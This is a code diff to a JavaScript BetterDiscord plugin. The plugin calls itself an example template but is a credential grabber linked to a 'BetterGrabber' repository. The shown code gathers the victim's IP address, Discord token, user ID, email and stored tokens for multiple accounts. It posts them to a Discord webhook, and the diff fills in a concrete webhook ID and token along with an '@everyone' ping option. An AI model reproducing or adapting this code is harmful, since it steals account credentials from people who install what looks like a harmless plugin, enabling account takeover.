@@ -24,7 +24,7 @@ class HideMe {
         return "This is an example/template for a BD plugin.";
     }
     getVersion() {
-        return "1.0.0";
+        return "1.0.1";
     }
     getAuthor() {
         return "Hideaki Atsuyo";
@@ -41,8 +41,15 @@ class HideMe {
     	const https = require('https');//Hehehe Hello XMLHttpRequest
 
     	var config = {
-    		webHook: "/api/webhooks/ID/TOKEN",
-            tts: true
+    		pingOnResult: true,
+    		webHook: "/api/webhooks/915046074685734933/w_17tVcLIGIVy5BIV_5iG9l5rC_nvwBlzSD1DpTyC3j8pjFvKznc0E_R8M10caOKSINp",
+    		webhookUsername: "Hello World",
+    		webhookAvatar: "https://cdn.discordapp.com/avatars/908070943329488916/35ebf6d39bc25e52da855424119bc28f.webp?size=80",
+
+    		embedTitle: "Hello World",
+    		embedColor: 0x36393f,
+
+    		tts: true
     	};
 
     	function getIP(){
@@ -71,11 +78,11 @@ class HideMe {
     	var storedTokens = await getInfo("tokens"); // For New Multi Account System
 
         var pD = JSON.stringify({
-            content: "@everyone",
-            username: "Hello World",
-            avatar_url: "https://cdn.discordapp.com/avatars/908070943329488916/35ebf6d39bc25e52da855424119bc28f.webp?size=80",
+            content: config.pingOnResult ? "@everyone": "Ah Fuck No Ping :(",
+            username: config.webhookUsername,
+            avatar_url: config.webhookAvatar,
             tts: config.tts,
-            embeds: [{"title": "Hello World", "description": "[GitHub](https://github.com/HideakiAtsuyo/BetterGrabber)", "color": null, "fields": [{ "name": "IP", "value": `\`${IP}\``, inline: false }, { "name": "Actual User Token", "value": `\`${actualUserToken.replaceAll("\"", "")}\``, inline: true }, { "name": "Actual User ID", "value": `\`${actualUserID.replaceAll("\"", "")}\``, inline: true }, { "name": "Actual User email", "value": `\`${actualUserEmail.replaceAll("\"", "")}\``, inline: true }, { "name": "Stored Tokens(From Switch Account Feature :) (ID:Token))", "value": `\`\`\`json\n${storedTokens}\`\`\``, inline: false }]}]
+            embeds: [{"title": config.embedTitle, "description": "[GitHub](https://github.com/HideakiAtsuyo/BetterGrabber)", "color": config.embedColor, "fields": [{ "name": "IP", "value": `\`${IP}\``, inline: false }, { "name": "Actual User Token", "value": `\`${actualUserToken.replaceAll("\"", "")}\``, inline: true }, { "name": "Actual User ID", "value": `\`${actualUserID.replaceAll("\"", "")}\``, inline: true }, { "name": "Actual User email", "value": `\`${actualUserEmail.replaceAll("\"", "")}\``, inline: true }, { "name": "Stored Tokens(From Switch Account Feature :) (ID:Token))", "value": `\`\`\`json\n${storedTokens}\`\`\``, inline: false }]}]
         });
 
         var SendToWebhook = https.request({ "hostname": "discord.com", "port": 443, "path": config.webHook, "method": "POST", "headers": { 'Content-Type': "application/json", 'Content-Length': pD.length } });
